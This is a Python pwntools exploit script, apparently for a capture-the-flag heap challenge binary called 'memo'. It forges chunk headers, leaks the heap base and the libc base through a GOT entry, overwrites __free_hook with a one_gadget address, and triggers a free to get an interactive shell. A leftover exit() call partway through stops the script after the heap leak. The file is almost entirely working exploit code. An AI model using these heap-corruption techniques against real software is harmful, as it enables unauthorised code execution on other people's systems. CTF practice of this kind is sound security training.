from pwn import *
import sys

context(arch='amd64', os='linux')

DEBUG = False
if len(sys.argv) > 1:
	DEBUG = True

def fn_leave(idx, n, msg, last=False):
	p.sendline("1")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(n))
	if last: return

	recv = p.recv()
	if DEBUG: print recv

	p.sendline(msg)
	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_edit(msg):
	p.sendline("2")
	recv = p.recv()
	if DEBUG: print recv

	p.send(msg)
	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_view(idx):
	p.sendline("3")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_free(idx, last=False):
	p.sendline("4")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	if last: return

	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_chg_pw(pw, name, new_pw):
	p.sendline("5")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(pw)
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

	p.send(new_pw)
	recv = p.recv()
	if DEBUG: print recv

def fn_leak(addr, n, title=""):
	print "*** {} ***".format(title)
	print hexdump(p.leak(addr, n))
	print

target = "./memo"

p = process(target)
e = ELF(target)

dbg_heap = 0x603000
addr_name = 0x602a20
addr_pass = 0x602a40
addr_msg = 0x602a70
got_libc_main = 0x601fb0
addr_cur_idx = 0x602a00

print p.recv()
p.sendline("hackability")
print p.recv()
p.sendline("y")
print p.recv()

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0) * 2
payload += "\xf0" # size of idx 0
p.sendline(payload)
print p.recv()

fn_leave(0, 0x20, "A"*4)
fn_leave(1, 0x20, "B"*4)
fn_leave(2, 0x20, "C"*4)

fn_free(2)
fn_free(1)
fn_free(0)

fn_leave(0, 0x20, "")
recv = fn_view(0).split("\x0a")[1]
base_heap = u64(("\x00" + recv).ljust(8, "\x00"))

print "[*] heap base : {}".format(hex(base_heap))

fn_free(0)

payload = ""
payload += p64(0) * 5 + p64(0x31)
payload += p64(addr_pass)
fn_leave(0, 0x80, payload)

fn_leak(base_heap, 0x80, "heap [0x603000]")
exit()

fn_leave(1, 0x20, "D"*8)
fn_leave(0, 0x20, "E"*8) # will place on password

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0)*2
payload += "\xf0"
fn_chg_pw("A", "hackability", payload)

fn_leak(addr_name, 0x60, str(hex(addr_name)))

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0xf0) * 2
fn_edit(payload)
fn_leak(addr_name, 0x60, str(hex(addr_name)))

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0xf0) * 2
payload += p64(addr_pass)
payload += p64(got_libc_main)
fn_edit(payload)

fn_leak(addr_name, 0x60, str(hex(addr_name)))

recv = fn_view(1).split(": ")[1].split("\x0a")[0]
recv = u64(recv.ljust(8, "\x00"))
libc_base = recv - 0x20740

one_shot      = libc_base + 0x4526a
__free_hook   = libc_base + 0x3c67a8
__libc_start_main = libc_base + 0x20740

print "libc base : {}".format(hex(libc_base))

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0xf0) * 2
payload += p64(addr_pass) * 2
payload += p64(__free_hook)
fn_edit(payload)
fn_leak(addr_cur_idx, 0x10, "cur idx")

fn_leak(addr_name, 0x60, str(hex(addr_name)))
fn_leak(__free_hook, 0x10, "__free_hook : "+hex(__free_hook))

fn_edit(p64(one_shot))
fn_leak(__free_hook, 0x10, "__free_hook : "+hex(__free_hook))

fn_free(0, True)
p.interactive()
